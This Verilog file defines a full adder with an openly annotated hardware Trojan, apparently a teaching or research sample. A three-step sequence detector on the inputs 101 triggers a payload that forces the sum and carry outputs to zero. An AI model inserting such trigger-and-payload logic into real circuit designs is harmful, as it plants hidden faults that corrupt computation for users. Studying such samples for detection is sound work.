module half_adder (
    input  a, b,
    output sum, carry
);
    assign sum   = a ^ b;   // XOR for sum
    assign carry = a & b;   // AND for carry
endmodule

module full_adder (
    input        clk, rst_n,    // TROJAN: Added clock and reset for Trojan logic
    input        a, b, cin,
    output reg   sum, cout      // TROJAN: Changed outputs to reg for sequential Trojan logic
);

    wire s1, c1, c2;

    // Trojan Registers
    reg [2:0] trigger_seq;     // TROJAN: Sequence detector for rare event
    reg       trojan_active;   // TROJAN: Latch when Trojan is triggered

    // Half adders
    half_adder ha1 (
        .a(a),
        .b(b),
        .sum(s1),
        .carry(c1)
    );

    half_adder ha2 (
        .a(s1),
        .b(cin),
        .sum(wsum),
        .carry(c2)
    );
    wire wsum;

    // Output logic with Trojan payload
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trigger_seq   <= 3'b000;
            trojan_active <= 1'b0;
            sum           <= 1'b0;
            cout          <= 1'b0;
        end else begin
            // Trojan Trigger: detect a rare input sequence (a,b,cin) = (1,0,1) three times in a row
            if ({a, b, cin} == 3'b101)
                trigger_seq <= {trigger_seq[1:0], 1'b1};
            else
                trigger_seq <= {trigger_seq[1:0], 1'b0};
            if (trigger_seq == 3'b111)
                trojan_active <= 1'b1;
            else if ({a, b, cin} != 3'b101)
                trojan_active <= 1'b0;
            
            // Payload: forcibly output sum=0, cout=0 when triggered
            if (trojan_active) begin
                sum  <= 1'b0;
                cout <= 1'b0;
            end else begin
                sum  <= wsum;
                cout <= c1 | c2;
            end
        end
    end

endmodule
